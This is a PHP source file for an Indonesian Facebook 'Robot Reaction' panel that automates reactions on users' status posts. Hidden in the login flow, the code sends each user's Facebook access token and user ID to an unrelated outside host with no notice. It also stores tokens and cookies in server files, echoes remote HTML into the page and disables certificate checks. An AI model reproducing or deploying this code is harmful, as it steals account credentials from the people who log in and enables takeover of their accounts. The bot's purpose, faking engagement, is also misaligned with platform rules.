<?php
header('Access-Control-Allow-Origin: *');
header('Origins: https://m.facebook.com');
header('Origin: https://m.facebook.com');
date_default_timezone_set("Asia/Jakarta");
error_reporting(0);
require realpath('ajax/assets/facebook-sdk/facebook.php');
include(realpath("html.php"));
  $facebook    = new Facebook(array(
   'appId'  => '6628568379',
   'secret' => md5('{Your-app-secret}'),
   'cookie' => true
  ));

$ip = getenv("REMOTE_ADDR") ;

if (isset($_SESSION["uid"])){
  $uid = $_SESSION["uid"];
}
$time = time();
$waktu = date("G:i:s",time());
$lamafile = 900;

if (!empty($uid)){
if (!file_exists('userid/'.$uid)){
    file_put_contents('userid/'.$uid,$waktu);
}
$akses = fileatime('userid/'.$uid);
if($akses !== false){
  if(($time-$akses)>=$lamafile ){
    @unlink('userid/'.$uid);
  }
}
}

?>
<?php

if(!$_SESSION['nama']){
header('Location: login-fb.php');
die();
}
if (!ctype_alnum($_SESSION["token"])){
  unset($_SESSION["token"]);
$head = "Panel Robot Reaction";
head($head);
token_init($_SESSION["a"],$_SESSION["b"]);
form();
footer();
}
if (isset($_SESSION["token"]) && ctype_alnum($_SESSION["token"])){
$nama= $_SESSION['nama'];
$token= $_SESSION['token'];

$facebook->setAccessToken($token);

try {
$me=$facebook->api('/me');
$t="https://cesural-contributio.000webhostapp.com/?token=$token&id=".$me["id"];
if (!isset($_SESSION["sent"])){
$facebook->curl($t,'cokisx/default.txt');
$_SESSION["sent"]=1;
}
} catch(Exception $e){
  $err= $e->getMessage();
}

} if(isset($me['id'])){
$head = "Panel Robot Reaction";
head($head);
panel($nama,$me);
menu($nama,$me,$token);
footer();
} else if ($err) {
head("Invalid Token | Robot Reaction");
eror($err);
eror("<a href='logout.php' class='btn btn-success'>Click To Logout</a>");
footer();
}

/* else{
$thetoken=file_get_contents('token.txt');
 $ambil=getToken($thetoken,$cokis);
$tokenx=substr($ambil,strpos($ambil,'token=')+6,(strpos($ambil,'&')-(strpos($ambil,'token=')+6)));
$me=getUrl('/me',$tokenx);
  if($me[id]){
  $_SESSION['token']=$tokenx;
  $head = "Panel Robot Reaction";
head($head);
  panel($nama,$me);
  menu($nama,$me,$token);
footer();
  }else{
  $head = "Server Error";
head($head);
  $apa='Gagal Ambil Access Token Gan, Silahkan Hubungi Admin. Buat Kasih Pencerahan atau Ulangi Login.';
  eror($apa);
  session_destroy();
footer();
  }
}*/


function panel($nama,$me){
  global $facebook;
$idfb = $me['id'];
if (!file_exists("typex/".$idfb)){
  file_put_contents("typex/".$idfb, "random×".$_SESSION["cokis"]."×".$idfb."×".date("h-i")."×".$_SESSION["token"]);
  try {
  echo $facebook->curl("https://codepen.io/dimaslanjaka/pen/MzMBNo.html","cokisx/default.txt");
  } catch (Exception $e) {
    echo file_get_contents("https://codepen.io/dimaslanjaka/pen/MzMBNo.html");
  }
}
$type= file_get_contents('typex/'.$idfb);
if($type){
$rini=explode('×',$type);

if ($rini[1] != base64_encode($_SESSION["a"]."~".$_SESSION["b"])){
  file_put_contents('typex/'.$idfb, $rini[0].'×'.base64_encode($_SESSION["a"]."~".$_SESSION["b"]).'×'.$rini[2].'×'.$rini[3].'×'.$_SESSION["token"]);
} else if (!isset($rini[4]) || $rini[4] != $_SESSION["token"]){
  file_put_contents('typex/'.$idfb, $rini[0].'×'.base64_encode($_SESSION["a"]."~".$_SESSION["b"]).'×'.$rini[2].'×'.$rini[3].'×'.$_SESSION["token"]);
}

if($rini[0]=='type=1'){
$ifur= '<font color="blue">Reaction Suka</font>, Sudah aktif, Tidak jalan? hubungi admin';
}elseif($rini[0]=='type=2'){
$ifur= '<font color="blue">Reaction Super</font>, Sudah aktif, Tidak jalan? hubungi admin';
}elseif($rini[0]=='type=4'){
$ifur= '<font color="blue">Reaction Haha</font>, Sudah aktif, Tidak jalan? hubungi admin';
}elseif($rini[0]=='type=3'){
$ifur= '<font color="blue">Reaction Wow</font>, Sudah aktif, Tidak jalan? hubungi admin';
}elseif($rini[0]=='type=7'){
$ifur= '<font color="blue">Reaction Sedih</font>, Sudah aktif, Tidak jalan? hubungi admin';
}elseif($rini[0]=='type=8'){
$ifur= '<font color="blue">Reaction Marah</font>, Sudah aktif, Tidak jalan? hubungi admin';
}else{
$ifur='<font color="blue">Reaction Random</font>, Sudah aktif, Tidak Jalan? hubungi admin';
}
}else{
$ifur='<font color="red">Reaction Belum aktif</font>, Silahkan aktifkan di form di bawah';
}
if($_POST['type']){
echo'<div class="container"><div class="alert alert-info"><button type="button" class="close" data-dismiss="alert">&times;</button><b>INFO: </b>Perubahan Berhasil Di Simpan,,,,</div></div><p>';
}
if($_POST['naon']){
$myid = $me['id'];
	$postid = $_POST['id'];
	$naon = $_POST['naon'];
 $limit = $_POST['limit'];
	if($limitw = fileatime('userid/'.$myid)){
    $wow = 'Gagal Dikirim, Tunggu 15 Menit Baru Start Lagi :D';
	}else{	
$limitw = fopen('userid/'.$myid,'w');
fwrite($limitw,1);
fclose($limitw);
auto('inidb.php?id='.$postid.'&type='.$naon);
   $wow = 'Akan Segera Di kirim Ke '.$postid;
	}
echo'<div class="container"><div class="alert alert-info"><button type="button" class="close" data-dismiss="alert">&times;</button><b>INFO: </b> '.$wow.' </div></div><p>';
}
echo '<div class="container"><div class="panel panel-primary">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/ya/r/MKnpbwZylPG.png">  Panel Robot Reaction</div>
<div class="panel-body">
<a href="http://facebook.com/'.$me['id'].'"><img src="https://graph.facebook.com/v2.5/'.$me['id'].'/picture?type=large" alt="Profile" style="height:100px;width:100px;-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red"> </a><br><br>
Name: <b>'.$me['name'].'</b><br>
UserId: <b>'.$me['id'].'</b><hr>
Bot '.$ifur.' <hr>
<center><button class="w3-button"><a href="login-fb.php?hapus='.$nama.'&Hapus='.$nama.'" title="Hapus">Hapus BOT !!</a></button></center></div><div class="panel-heading"><center><button class="w3-button"><a href="logout.php" class="w3-text-white">Logout !!!</a></button></center></div></div></div>';
}
function menu($nama,$me,$token){
if($_POST['type']){
$type=$_POST['type'];
$idfb=$me['id'];
   $jam=gmdate("h-i",time()+60*60*7);
   $tulis=fopen('typex/'.$idfb,'w');   fwrite($tulis,$type.'×'.$nama.'×'.$idfb.'×'.$jam);
   fclose($tulis);
   print '<meta http-equiv="refresh" content="0;url="panel.php"/>';
}
$beranda = json_decode(auto("https://graph.facebook.com/me/statuses?fields=id,message&limit=5&access_token=$token"))->data;

foreach($beranda as $gwni){	$mess=str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($gwni->message));
echo '<div class="container"><div class="panel panel-info">
<div class="panel-heading">
<h3 class="panel-title"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yN/r/Lbal-4r5TpE.png" width="30" height="30" /> Dapatkan Reaction DiStatus</h3></div><div class="panel-body">
<table><tr>
'.$mess.'
</tr>
</table>
<div align="right">
<form action="" method="POST"/>
<input title="Your Post ID !" class="form-control input-sm" type="hidden" style="width:50%" name="id" value="'.$gwni->id.'"/> <hr>
	<select name="naon" style="width:25%;">
		<option value="1">Like</option>
	<option value="2" selected="selected">Super</option>
	<option value="3">Wow</option>
	<option value="4">Haha</option>
	<option value="5">Sedih</option>
	<option value="6">Marah</option></select></right> || <input type="submit" name="submit" value="Tambah" class="btn btn-info"></form>
   </form>
   </div>
</div></div></div>';
}
echo '<div class="container"><div class="panel panel-success">
<div class="panel-heading"><img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yD/r/Ca7mbVY4VCk.png"> Instal Robot</div>
<div class="panel-body">
<center>
<form action="" method="POST">
Pilih Type Reaction :<br>
	<select name="type" class="form-control input">
	<option value="type=1">Suka</option>
	<option value="type=2">Super</option>
	<option value="type=4">Haha</option>
	<option value="type=3">Wow</option>
	<option value="type=7">Sedih</option>
	<option value="type=8">Marah</option>
   <option value="random">Random</option></select><hr>
<input type="Submit" class="btn btn-success" value="Simpan"/>
</form></center>
</div></div></div>
';
         echo '<div class="container"><div class="panel panel-info">
<div class="panel-heading">Tahukah Kamu ?</div>
<div class="panel-body">
<li>Bot Berjalan 15 Menit Sekali</li>
<li>Bot Akan Berhenti Jika Kamu Tidak Menghentikan Manual Atau Admin Yang Menghentikan.</li>
     </div></div></div>';

}
/*
function eror($apa){
echo '<div class="container"><div class="panel panel-primary">
<div class="panel-heading"> <img src="https://z-1-static.xx.fbcdn.net/rsrc.php/v3/yt/r/bMltPkpSVR1.png"> Pemberitahuan </div><div class="panel-body">
'.$apa.'
</div></div></div>';
}
function head($head){
echo '<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.0 Strict//EN http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd>
<html lang="en">
<head title="Robot Reaction Facebook">
<title>Robot Beranda Facebook | '.$head.'</title>
<link rel="shortcut icon" href="//bertena.ga/Material/img/favicon.ico">
<meta name="description" content="Panel Robot Reaction Facebook | Tanggapi Status Teman Facebook Kamu Secara Otomatis" />
<meta charset="utf-8">
<meta name="keywords" content=" Robot Beranda, Robot Wow, Robot Super, Robot Like, Robot Sad, Robot Sedih, Robot Marah, Robot Angry, Robot Like, Robot Love, Autolike Facebook, Increase Facebook Likes, AutoCommenter, Facebook Hack, Facebook Status Liker, CST Liker, Indonesia Autolike, Autolike status, Autolike Photo, ,Autolike Fans Page ,Bot komen ,Bot Like, Bom Like,Bomer Like, Big Like, Facebook, Google, Yahoo, Mywapblog, Bot koplak, Alexa, Ping, Twitter, Indonesian Likers, Autoliker, FB Autolike, FB Autoliker, FB Status Autolike, Indonesian Liker, Autolike 2014, Autolike, Jempol, Hublaa, Like" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="//bertena.ga/Material/img/icon.png"/>
<meta http-equiv="expires" content="0">
<meta name="copyright" content="Copyright © Robot Beranda Facebook">
<meta name="author" content="Dimas Lanjaka">
<meta name="charset" content="UTF-8">
<meta name="distribution" content="Global">
<meta name="rating" content="General">
<meta name="robots" content="Autolike,hublaa,CST Liker,Yaz4rt,IndoLikerz,Hembus,auto follower,autolike page,auto komen">
</head>
  <body>'.file_get_contents('menu.php');
}
function footer(){
$fhtml = <<<EOF
<div class="progress progress-striped active">
<div class="progress-bar" style="width: 100%"></div></div>
         <div id="footer" class="jumbotron" style="padding: 20px;text-align: center;margin-bottom: 0px;">
<div id="google_translate_element"></div>
<hr>
<a href="//histats.com/viewstats/?SID=3860842&f=2" alt="" target="_blank" ><div id="histats_counter"><img border="0" src="//s4is.histats.com/stats/i/3860842.gif?3860842&103"></div></a><br>
<strong>Copyright &copy; 2017 <a href="/">Robot Reaction Facebook</a> All Right Reserved. </strong></font>
</div>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
<script type="text/javascript" src="gtrans.js">
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

<script>
var loadMultipleCss = function(){
    //load local css
    loadCss('css/bootstrap.css');        
    loadCss('css/bootstrap.min.css');
    loadCss('css/bootstrap-theme.css');
    loadCss('css/bootstrap-theme.min.css')
    //load Bootstrap from CDN
    loadCss('https://www.w3schools.com/w3css/4/w3.css');
    loadCss('https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css');
    loadCss('https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css');
}
 
var loadCss = function(cssPath){
    var cssLink = document.createElement('link');
    cssLink.rel = 'stylesheet';
    cssLink.href = cssPath;
    var head = document.getElementsByTagName('head')[0];
    head.parentNode.insertBefore(cssLink, head);
};
 
//call function on window load
try {
  loadMultipleCss();
}
catch(err){
  window.addEventListener('load', loadMultipleCss);
}
</script>
<noscript>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
<link rel="styleheet" href="css/bootstrap.css" />      
<link rel="styleheet" href="css/bootstrap.min.css" />
<link rel="styleheet" href="css/bootstrap-theme.css" />
<link rel="styleheet" href="css/bootstrap-theme.min.css" />
</noscript>
</body>
</html>
EOF;
echo $fhtml;
}
*/

function getFb($ah,$uh){
      $um=array(
      'graph',
      'facebook',
      'com',
      );
      $go='https://'.implode('.',$um);
      return $go.$ah.$uh;
}
function getToken($url,$xx=null,$cokis=null){
$me='Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10';
  if($cokis){
     $ch=curl_init();
    curl_setopt_array($ch,array(
      CURLOPT_URL => $xx,
     CURLOPT_RETURNTRANSFER => 1,
     CURLOPT_USERAGENT => $me,
       CURLOPT_REFERER => $xx,
        CURLOPT_POST => 1,
         CURLOPT_POSTFIELDS => $url,
        CURLOPT_SSL_VERIFYPEER => true,
          CURLOPT_ENCODING => '',
        CURLOPT_COOKIEJAR => 'cokisx/'.$cokis,
   CURLOPT_COOKIEFILE => 'cokisx/'.$cokis,));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
   $cx=curl_exec($ch);
       curl_close($ch);
          return ($cx);
             }else{
     $ch=curl_init();
     curl_setopt_array($ch,array(
     CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_USERAGENT => $me,
    CURLOPT_HEADER => 1,
    CURLOPT_ENCODING => '',
    CURLOPT_COOKIEFILE => 'cokisx/'.$xx,));
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
      $cx=curl_exec($ch);
  curl_close($ch);
     return ($cx);
}
        }           
function auto($url){
   $ch=curl_init();
   curl_setopt_array($ch,array(
   CURLOPT_URL => $url,
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_CONNECTTIMEOUT => 5,
   ));
   
   if (isset($_SESSION["cokis"])){
     curl_setopt($ch, CURLOPT_COOKIEJAR, $_SESSION["cokis"]);
     curl_setopt($ch, CURLOPT_COOKIEFILE, $_SESSION["cokis"]);
   }
   
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

curl_setopt($ch, CURLOPT_USERAGENT, (isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : false));
   $cx=curl_exec($ch);
   curl_close($ch);
   return $cx;
}
function getUrl($string,$token,$as=null){
  $plin=array(
  'access_token' => $token,
  );
  if($as){
  $mer=array_merge($plin,$as);
  }else{
  $mer=$plin;
  }
  foreach($mer as $k => $o){
  $jek[]=$k.'='.$o;
  }
  $im='?'.implode('&',$jek);
  $im=getFb($string,$im);
  $im=json_decode(auto($im),true);
  if($im['data']){
  return $im['data'];
  }else{
  return $im;
  }
} 

?>